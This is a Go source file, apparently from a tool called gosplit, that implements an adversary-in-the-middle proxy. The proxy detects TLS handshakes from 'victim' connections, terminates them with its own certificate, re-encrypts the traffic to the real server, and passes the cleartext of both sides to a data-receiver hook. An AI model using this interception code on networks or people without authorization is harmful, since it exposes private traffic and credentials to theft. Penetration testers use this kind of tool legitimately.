package gosplit

import (
	"bufio"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"time"
)

type (
	// proxyConn maps the proxy server's connection to the downstream connection.
	proxyConn struct {
		net.Conn                // server connection to victim
		downstream     net.Conn // client connection to downstream target
		proxyAddr      *ProxyAddr
		victimAddr     *VictimAddr
		downstreamAddr *DownstreamAddr
		cfg            cfg          // provides getters for configuration data
		s              *ProxyServer // allows handle to decrement the connection counter
	}

	// peekConn allows peeking at the first few bytes to determine
	// if the client want's to speak TLS.
	peekConn struct {
		net.Conn
		buf *bufio.Reader
	}

	// dataHandlerConn determines if cfg implements DataReceiver and passes
	// data to the method when it does, allowing implementors to receive
	// cleartext data passing through the proxy.
	dataHandlerConn struct {
		net.Conn
		cfg      cfg
		connInfo ConnInfo
	}
)

// Write to the connection.
//
// Note: This is the victim side of the intercepted connection.
func (c *dataHandlerConn) Write(b []byte) (n int, err error) {
	if dh, ok := c.cfg.Cfg.(DataReceiver); ok {
		go dh.RecvVictimData(b, c.connInfo)
	}
	return c.Conn.Write(b)
}

// Read from the connection.
//
// Note: This is the downstream side of the intercepted connection.
func (c *dataHandlerConn) Read(b []byte) (n int, err error) {
	n, err = c.Conn.Read(b)
	if dh, ok := c.cfg.Cfg.(DataReceiver); ok {
		go dh.RecvDownstreamData(b[0:n], c.connInfo)
	}
	return
}

func (c *peekConn) Peek(n int) ([]byte, error) {
	return c.buf.Peek(n)
}

func (c *peekConn) Read(b []byte) (n int, err error) {
	return c.buf.Read(b)
}

func (c *proxyConn) log(lvl, msg string) {
	c.cfg.log(c, lvl, msg)
}

func (c *proxyConn) connEnd() {
	c.cfg.connEnd(c)
}

func (c *proxyConn) Close() (err error) {
	if _, ok := c.Conn.(io.Closer); ok {
		err = c.Conn.Close()
		if err != nil {
			err = fmt.Errorf("failed to close proxy connection: %w", err)
		}
	}
	if _, ok := c.downstream.(io.Closer); ok {
		e := c.downstream.Close()
		if e != nil {
			err = fmt.Errorf("; failed to close downstream conn (%w)", e)
		}
	}
	c.connEnd()
	return
}

func (c *proxyConn) close() {
	if err := c.Close(); err != nil {
		c.log(ErrorLogLvl, fmt.Sprintf("failed to close connection: %s", err))
	}
}

// handle accepts TCP connections from AITM victims and fingerprints
// them for TLS, followed by establishing a connection with the AITM
// downstream.
//
// Limitations:
//
// - SSL is not currently supported
//   - See https://github.com/golang/go/issues/32716
// - The client is presumed to send data over the connection first
//   - This will surely break any protocol expecting the server to
//     send first, e.g., FTP Active Mode.
// - It assumes that the initial client connection is a TLS handshake
//   - Proxying for SMTP servers relying upon STARTTLS will fail
func (c *proxyConn) handle(ctx context.Context) {

	// cancel ensures that the connection is closed after the blocking
	// copy function ends
	var cancel context.CancelFunc
	ctx, cancel = context.WithCancel(ctx)
	context.AfterFunc(ctx, c.close)

	c.cfg.connStart(c)
	var err error

	// get the victim ip and port
	var vA VictimAddr
	if vA, err = getVictimAddr(c.Conn); err != nil {
		c.log(ErrorLogLvl, err.Error())
		cancel()
		return
	}
	c.victimAddr = &vA

	//================
	// FINGERPRINT TLS
	//================

	var (
		checkHs func([]byte) bool
		hsLen   = 3
	)
	if v, ok := c.cfg.Cfg.(Handshaker); ok {
		checkHs = v.IsHandshake
		hsLen = v.GetHandshakeLen()
	} else {
		checkHs = isHandshake
	}

	if peek, err := c.Conn.(*peekConn).Peek(hsLen); err != nil {
		c.log(ErrorLogLvl, "failure checking incoming proxy connection for tls")
		cancel()
		return
	} else if checkHs(peek) {
		c.log(DebugLogLvl, "upgrading proxy connection to tls")
		var tlsCfg *tls.Config
		tlsCfg, err = c.cfg.GetProxyTLSConfig(*c.proxyAddr, *c.victimAddr)
		if err != nil {
			c.log(ErrorLogLvl, "failure getting proxy tls config")
			cancel()
			return
		}
		c.Conn = tls.Server(c.Conn, tlsCfg)
	}

	//==================================================
	// ESTABLISH CONNECTION WITH DOWNSTREAM FOR PROXYING
	//==================================================

	// request the downstream
	var dA DownstreamAddr
	if dA.IP, dA.Port, err = c.cfg.GetDownstreamAddr(*c.proxyAddr, *c.victimAddr); err != nil {
		c.log(ErrorLogLvl, "no aitm downstream for connection")
		cancel()
		return
	}
	c.downstreamAddr = &dA

	// connect to the downstream
	if uC, err := net.Dial("tcp4", net.JoinHostPort(dA.IP, dA.Port)); err != nil {
		c.log(ErrorLogLvl, "error connecting to downstream")
		cancel()
		return
	} else if _, ok := c.Conn.(*tls.Conn); ok {
		// upgrade to tls
		c.log(DebugLogLvl, "upgrading downstream connection to tls")
		var tlsCfg *tls.Config
		tlsCfg, err = c.cfg.GetDownstreamTLSConfig(*c.proxyAddr, *c.victimAddr)
		if err != nil {
			c.log(ErrorLogLvl, "failure getting downstream tls config")
			cancel()
			return
		}
		c.downstream = tls.Client(uC, tlsCfg)
	} else {
		c.downstream = uC
	}

	c.downstream = &dataHandlerConn{
		Conn: c.downstream,
		cfg:  c.cfg,
		connInfo: ConnInfo{
			Time:           time.Now(),
			VictimAddr:     vA,
			ProxyAddr:      *c.proxyAddr,
			DownstreamAddr: dA,
		},
	}

	c.log(DebugLogLvl, "new connection established")

	//=================================
	// COPY TRAFFIC BETWEEN CONNECTIONS
	//=================================

	// put one side of the connection in routine
	go func() {
		if _, err := io.Copy(c, c.downstream); err != nil && !errors.Is(err, net.ErrClosed) {
			c.log(ErrorLogLvl, fmt.Sprintf("error copying data between connections (proxy to downstream): %s", err))
		}
		c.log(DebugLogLvl, "finished relaying data (proxy to downstream)")
	}()

	// block until one side of the connection dies
	if _, err := io.Copy(c.downstream, c); err != nil && !errors.Is(err, net.ErrClosed) {
		c.log(ErrorLogLvl, fmt.Sprintf("error copying data between connections (downstream to proxy): %s", err))
	}
	c.log(DebugLogLvl, "finished relaying data (downstream to proxy)")

	cancel()
}
